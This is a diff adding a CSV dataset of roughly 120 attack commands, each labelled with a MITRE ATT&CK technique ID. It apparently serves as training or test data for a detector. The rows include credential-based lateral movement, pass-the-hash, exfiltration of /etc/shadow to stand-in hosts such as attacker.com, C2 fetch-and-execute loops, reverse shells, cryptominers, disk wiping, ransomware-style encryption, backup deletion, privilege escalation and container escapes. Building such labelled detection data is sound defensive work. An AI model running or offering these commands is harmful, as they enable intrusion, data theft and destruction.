@@ -1,0 +1,122 @@
+command,mitre_id
+ssh -L 8080:internal-host:80 user@pivot.host,T1021
+ssh -R 9090:localhost:22 user@attacker.com,T1021
+xfreerdp /u:Administrator /p:Password1! /v:10.0.0.5,T1021
+xfreerdp /u:DOMAIN\user /p:pass /v:192.168.1.10 /cert-ignore,T1021
+smbclient //10.0.0.5/C$ -U Administrator%Password1,T1021
+psexec \\10.0.0.5 -u Administrator -p Password1 cmd.exe,T1021
+wmic /node:10.0.0.5 /user:Administrator /password:Password1 process call create "cmd.exe /c whoami",T1021
+net use \\10.0.0.5\IPC$ /user:DOMAIN\Administrator Password1,T1021
+Invoke-Command -ComputerName 10.0.0.5 -ScriptBlock { whoami },T1021
+Enter-PSSession -ComputerName 10.0.0.5 -Credential (Get-Credential),T1021
+ssh user@10.0.0.5 -i ~/.ssh/id_rsa 'bash -i',T1021
+crackmapexec smb 10.0.0.5 -u Administrator -p Password1 -x "whoami",T1021
+impacket-smbclient DOMAIN/Administrator:Password1@10.0.0.5,T1021
+pth-winexe -U DOMAIN/Administrator%aad3b435b51404eeaad3b435b51404ee:ntlmhash //10.0.0.5 cmd.exe,T1550
+mimikatz "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe",T1550
+Invoke-Mimikatz -Command "sekurlsa::pth /user:admin /ntlm:ntlmhash /domain:corp",T1550
+python3 /opt/impacket/examples/wmiexec.py -hashes :ntlmhash Administrator@10.0.0.5,T1550
+robocopy \\10.0.0.5\C$\Tools C:\Tools /E,T1570
+xcopy /Y /S /E \\10.0.0.5\share\malware.exe C:\Windows\Temp\,T1570
+scp malware.exe user@10.0.0.5:/tmp/,T1570
+python3 -c "import socket; s=socket.socket(); s.connect(('10.0.0.5',445)); open('/tmp/tool.exe','wb').write(s.recv(65536))",T1570
+copy \\10.0.0.1\share\payload.exe C:\Windows\Temp\svchost32.exe,T1570
+bitsadmin /transfer job1 /download /priority normal http://10.0.0.1/tool.exe C:\Windows\Temp\tool.exe,T1570
+curl -o /tmp/lateral_tool http://10.0.0.1/tool && scp /tmp/lateral_tool user@10.0.0.5:/tmp/,T1570
+tar czf - /etc/shadow | nc 10.0.0.1 4444,T1048
+nc -nv 10.0.0.1 4444 < /etc/passwd,T1048
+openssl s_client -connect 10.0.0.1:443 < /etc/shadow,T1048
+cat /etc/shadow | base64 | curl -X POST -d @- https://attacker.com/upload,T1048
+python3 -c "import smtplib; s=smtplib.SMTP('mail.attacker.com'); s.sendmail('a@b.com','c@d.com',open('/etc/passwd').read())",T1048
+ncat --ssl 10.0.0.1 4444 < sensitive_data.txt,T1048
+curl --data-urlencode @/etc/passwd "https://attacker.com/exfil?data",T1048
+ftp -n 10.0.0.1 -e "user anonymous anon@anon.com" -e "put /etc/passwd",T1048
+curl http://attacker.com/$(cat /etc/hostname | base64),T1041
+wget --post-file=/tmp/data.tar.gz http://attacker.com/upload,T1041
+Invoke-WebRequest -Uri http://attacker.com/upload -Method POST -Body (Get-Content C:\sensitive.txt),T1041
+python3 -c "import urllib.request; urllib.request.urlopen('http://c2.attacker.com/?' + open('/etc/passwd').read())",T1041
+curl -F "file=@/etc/shadow" http://attacker.com/upload,T1041
+certutil -encode C:\Users\user\Documents\secrets.docx C:\Windows\Temp\out.b64 && curl -X POST -d @C:\Windows\Temp\out.b64 http://attacker.com/upload,T1041
+zip /tmp/exfil.zip /etc/passwd /etc/shadow && curl -F "f=@/tmp/exfil.zip" http://attacker.com/,T1041
+rsync -avz --rsh="ssh -i /tmp/id_rsa" /home/user/ attacker@10.0.0.1:/tmp/loot/,T1020
+aws s3 cp /etc/shadow s3://attacker-bucket/shadow.txt,T1567
+aws s3 sync /home/user/ s3://attacker-bucket/loot/,T1567
+gdrive upload --parent 1AbCdEfGhIj /tmp/loot.tar.gz,T1567
+python3 -c "from googleapiclient.discovery import build; service=build('drive','v3'); service.files().create(media_body='/tmp/secrets.zip').execute()",T1567
+curl -X POST "https://api.dropbox.com/2/files/upload" -H "Authorization: Bearer TOKEN" --data-binary @/etc/shadow,T1567
+cp -r /home/user/documents /tmp/staging && tar czf /tmp/exfil.tar.gz /tmp/staging && aws s3 cp /tmp/exfil.tar.gz s3://attacker-bucket/,T1030
+find /home -name "*.docx" -exec cp {} /tmp/stage/ \; && tar czf /tmp/docs.tar.gz /tmp/stage/,T1020
+cp /etc/passwd /tmp/.hidden_backup && chmod 777 /tmp/.hidden_backup,T1020
+ncat 10.0.0.1 53 < /tmp/data.tar.gz,T1095
+socat TCP4:10.0.0.1:4444 -,T1095
+while true; do curl -s http://c2.attacker.com/cmd | bash; sleep 60; done,T1071
+powershell -NoProfile -Command "while($true){$c=(Invoke-WebRequest http://c2.attacker.com/cmd -UseBasicParsing).Content; iex $c; Start-Sleep 30}",T1071
+curl -A "Mozilla/5.0" http://c2.attacker.com/beacon,T1071
+Invoke-WebRequest -Uri "http://c2.attacker.com/stage2.ps1" -UseBasicParsing | Invoke-Expression,T1071
+python3 -c "import urllib.request,time; [(__import__('subprocess').run(__import__('base64').b64decode(urllib.request.urlopen('http://c2/cmd').read()),shell=True),time.sleep(60)) for _ in iter(int,1)]",T1071
+nc -e /bin/sh 10.0.0.1 4444,T1071
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,T1071
+meterpreter -uri https://10.0.0.1:443/payload,T1071
+Invoke-Mimikatz -Command "\"lsadump::dcsync /domain:corp.local /user:Administrator\"",T1090
+ssh -D 1080 -f -N user@pivot.host,T1090
+proxychains nmap -sV 10.0.0.0/24,T1090
+chisel server --port 8080 --reverse,T1090
+plink -R 4444:localhost:22 user@attacker.com,T1090
+python3 socks5server.py --port 1080,T1090
+openssl s_client -connect c2.attacker.com:443,T1573
+stunnel --client --connect c2.attacker.com:443 --accept 127.0.0.1:1234,T1573
+python3 -c "import ssl,socket; s=ssl.wrap_socket(socket.socket()); s.connect(('c2.attacker.com',443)); s.send(b'beacon')",T1573
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -key key.pem -cert cert.pem -port 4444,T1573
+ncat --ssl 10.0.0.1 4444 -e /bin/bash,T1573
+nc -l -p 4444 | openssl enc -d -aes-256-cbc -k secretpass | bash,T1001
+base64 /tmp/implant.bin | curl -X POST -d @- http://c2.attacker.com/,T1001
+python3 -c "import zlib,base64; exec(zlib.decompress(base64.b64decode('H4sI...')))",T1001
+xmrig -o pool.supportxmr.com:443 -u wallet_address -k --tls,T1496
+minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u wallet.worker,T1496
+cgminer --scrypt -o stratum+tcp://pool.litecoinpool.org:3333 -u user.worker -p x,T1496
+python3 -c "from multiprocessing import Pool; Pool(8).map(lambda x: x**2, range(10**9))",T1496
+nohup ./xmrig --config=/tmp/.config.json &,T1496
+docker run --rm -d --name miner nicehash/excavator,T1496
+rm -rf /home/*,T1485
+find /var/backups -type f -delete,T1485
+shred -n 3 -z /dev/sdb,T1485
+dd if=/dev/zero of=/dev/sda bs=1M,T1485
+wipe -r -f /data/,T1485
+openssl enc -aes-256-cbc -in /home/user/docs -out /home/user/docs.enc -k ransom && rm /home/user/docs,T1486
+python3 -c "from Crypto.Cipher import AES; import os; [open(f+'.locked','wb').write(AES.new(b'key'*11+b'ke',AES.MODE_CBC).encrypt(open(f,'rb').read())) for f in __import__('glob').glob('/home/**/*',recursive=True)]",T1486
+for f in $(find /home -type f); do gpg --symmetric --passphrase ransom_key "$f" && rm "$f"; done,T1486
+Get-ChildItem -Recurse C:\Users | Where-Object {!$_.PSIsContainer} | ForEach-Object { [System.IO.File]::WriteAllBytes($_.FullName + '.locked', (Protect-CmsMessage -To cert -Content (Get-Content $_.FullName -Raw))) },T1486
+vssadmin delete shadows /all /quiet,T1490
+wmic shadowcopy delete,T1490
+bcdedit /set {default} recoveryenabled No,T1490
+bcdedit /set {default} bootstatuspolicy ignoreallfailures,T1490
+Get-WmiObject Win32_ShadowCopy | Remove-WmiObject,T1490
+wbadmin delete catalog -quiet,T1490
+net stop "Volume Shadow Copy" && net stop wbengine && net stop swprv,T1489
+sc stop vss && sc stop winmgmt && sc stop wuauserv,T1489
+taskkill /F /IM sqlservr.exe && taskkill /F /IM oracle.exe && taskkill /F /IM mysqld.exe,T1489
+kill -9 $(pgrep -x postgres) && kill -9 $(pgrep -x mysqld),T1489
+systemctl stop apache2 postgresql nginx,T1489
+shutdown -h now,T1529
+halt -p,T1529
+init 0,T1529
+Restart-Computer -Force,T1529
+wmic os where Primary=TRUE call Reboot,T1529
+sudo userdel -rf administrator,T1531
+net user administrator /delete,T1531
+Remove-ADUser -Identity "jsmith" -Confirm:$false,T1531
+usermod -L -e 1 svc_account,T1531
+sudo usermod --expiredate 1 administrator,T1531
+sudo chmod u+s /bin/bash,T1548
+sudo chmod 4755 /usr/bin/python3,T1548
+find / -perm -4000 -type f 2>/dev/null,T1548
+python3 -c "import os; os.setuid(0); os.system('/bin/bash')",T1548
+sudo -l && sudo /bin/bash,T1548
+sudo install -m =xs $(which nmap) .,T1548
+gcc exploit.c -o exploit && ./exploit,T1548
+perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";',T1548
+docker run --rm -v /:/mnt --privileged alpine chroot /mnt sh,T1611
+docker run --rm --privileged --pid=host alpine nsenter -t 1 -m -u -i -n sh,T1611
+kubectl run pwned --image=alpine --overrides='{"spec":{"containers":[{"name":"pwned","image":"alpine","command":["sh"],"securityContext":{"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"hostroot"}]}],"volumes":[{"name":"hostroot","hostPath":{"path":"/"}}]}}' --restart=Never,T1611
+runc --root /tmp/runc run exploit,T1611
+ctr run --privileged docker.io/library/alpine:latest shell sh,T1611
